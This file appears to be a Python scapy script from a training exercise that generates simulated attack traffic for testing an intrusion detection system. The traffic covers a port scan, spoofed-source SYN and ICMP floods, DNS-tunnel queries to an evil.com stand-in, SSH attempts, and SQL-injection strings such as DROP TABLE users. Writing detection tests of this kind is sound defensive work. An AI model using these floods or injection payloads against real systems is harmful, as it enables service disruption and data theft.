#!/usr/bin/env python3
"""
Day6 实战：IDS 测试数据包生成器
用途：生成模拟攻击流量，测试 IDS 各项检测能力

运行：sudo python3 test_ids.py --iface lo
"""

import sys
import random
import time
import argparse

try:
    from scapy.all import *
    conf.verb = 0
except ImportError:
    print("[!] 需要安装 scapy: pip install scapy")
    sys.exit(1)


def generate_port_scan(target="192.168.1.1", count=30):
    """模拟 SYN 端口扫描"""
    print(f"  [>] 模拟 SYN 端口扫描: {count} 个端口")
    packets = []
    for port in range(1, count + 1):
        pkt = IP(src="10.0.0.100", dst=target) / \
              TCP(sport=random.randint(1024, 65535), dport=port, flags="S")
        packets.append(pkt)
    return packets


def generate_syn_flood(target="192.168.1.1", count=300):
    """模拟 SYN Flood"""
    print(f"  [>] 模拟 SYN Flood: {count} 个 SYN 包")
    packets = []
    for _ in range(count):
        src = f"10.0.{random.randint(1,254)}.{random.randint(1,254)}"
        pkt = IP(src=src, dst=target) / \
              TCP(sport=random.randint(1024, 65535), dport=80, flags="S")
        packets.append(pkt)
    return packets


def generate_icmp_flood(target="192.168.1.1", count=150):
    """模拟 ICMP Flood"""
    print(f"  [>] 模拟 ICMP Flood: {count} 个 ICMP 包")
    packets = []
    for _ in range(count):
        pkt = IP(src="10.0.0.100", dst=target) / ICMP(type=8)
        packets.append(pkt)
    return packets


def generate_dns_tunnel(target="192.168.1.1", count=60):
    """模拟 DNS 隧道（超长子域名）"""
    print(f"  [>] 模拟 DNS 隧道: {count} 次超长域名查询")
    packets = []
    for i in range(count):
        # 超长子域名（模拟编码后的数据）
        subdomain = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=70))
        domain = f"{subdomain}.evil.com"
        pkt = IP(src="192.168.1.50", dst="8.8.8.8") / \
              UDP(sport=random.randint(1024, 65535), dport=53) / \
              DNS(rd=1, qd=DNSQR(qname=domain))
        packets.append(pkt)
    return packets


def generate_ssh_bruteforce(target="192.168.1.1", count=20):
    """模拟 SSH 暴力破解"""
    print(f"  [>] 模拟 SSH 暴力破解: {count} 次 SSH 连接")
    packets = []
    for _ in range(count):
        pkt = IP(src="10.0.0.200", dst=target) / \
              TCP(sport=random.randint(1024, 65535), dport=22, flags="S")
        packets.append(pkt)
    return packets


def generate_sqli_payload(target="192.168.1.1"):
    """模拟 SQL 注入 Payload"""
    print(f"  [>] 模拟 SQL 注入 Payload")
    payloads = [
        b"GET /login?user=admin' OR 1=1--&pass=test HTTP/1.1\r\nHost: target\r\n\r\n",
        b"POST /search HTTP/1.1\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nq=union select username,password from users--",
        b"GET /page?id=1; DROP TABLE users;-- HTTP/1.1\r\nHost: target\r\n\r\n",
    ]
    packets = []
    for payload in payloads:
        pkt = IP(src="10.0.0.50", dst=target) / \
              TCP(sport=random.randint(1024, 65535), dport=80) / \
              Raw(load=payload)
        packets.append(pkt)
    return packets


def generate_telnet_traffic(target="192.168.1.1", count=5):
    """模拟 Telnet 流量"""
    print(f"  [>] 模拟 Telnet 明文流量: {count} 个包")
    packets = []
    for _ in range(count):
        pkt = IP(src="192.168.1.50", dst=target) / \
              TCP(sport=random.randint(1024, 65535), dport=23, flags="A") / \
              Raw(load=b"root\r\npassword123\r\n")
        packets.append(pkt)
    return packets


def main():
    parser = argparse.ArgumentParser(description='IDS 测试包生成器')
    parser.add_argument('--iface', '-i', default='lo', help='发送网卡 (默认 lo)')
    parser.add_argument('--target', '-t', default='192.168.1.1', help='目标 IP')
    parser.add_argument('--attack', '-a', default='all',
                        choices=['all', 'scan', 'flood', 'dns', 'ssh', 'sqli', 'telnet'],
                        help='要模拟的攻击类型')
    parser.add_argument('--offline', action='store_true', help='离线模式(只生成PCAP不发送)')
    args = parser.parse_args()

    print("=" * 60)
    print("  IDS 测试数据包生成器")
    print("=" * 60)
    print(f"  目标: {args.target}")
    print(f"  模式: {'离线(生成PCAP)' if args.offline else f'在线(发送到 {args.iface})'}")
    print()

    all_packets = []

    # 根据选择生成攻击包
    attack = args.attack

    if attack in ('all', 'scan'):
        all_packets += generate_port_scan(args.target)
    if attack in ('all', 'flood'):
        all_packets += generate_syn_flood(args.target)
        all_packets += generate_icmp_flood(args.target)
    if attack in ('all', 'dns'):
        all_packets += generate_dns_tunnel(args.target)
    if attack in ('all', 'ssh'):
        all_packets += generate_ssh_bruteforce(args.target)
    if attack in ('all', 'sqli'):
        all_packets += generate_sqli_payload(args.target)
    if attack in ('all', 'telnet'):
        all_packets += generate_telnet_traffic(args.target)

    random.shuffle(all_packets)

    print(f"\n  总计: {len(all_packets)} 个测试数据包")

    if args.offline:
        # 保存为 PCAP
        outfile = f"test_attack_{args.attack}.pcap"
        wrpcap(outfile, all_packets)
        print(f"  已保存: {outfile}")
        print(f"  回放: sudo tcpreplay -i {args.iface} {outfile}")
    else:
        # 直接发送
        print(f"  开始发送...")
        send(all_packets, iface=args.iface, inter=0.01)
        print(f"  发送完成!")

    print()


if __name__ == "__main__":
    main()
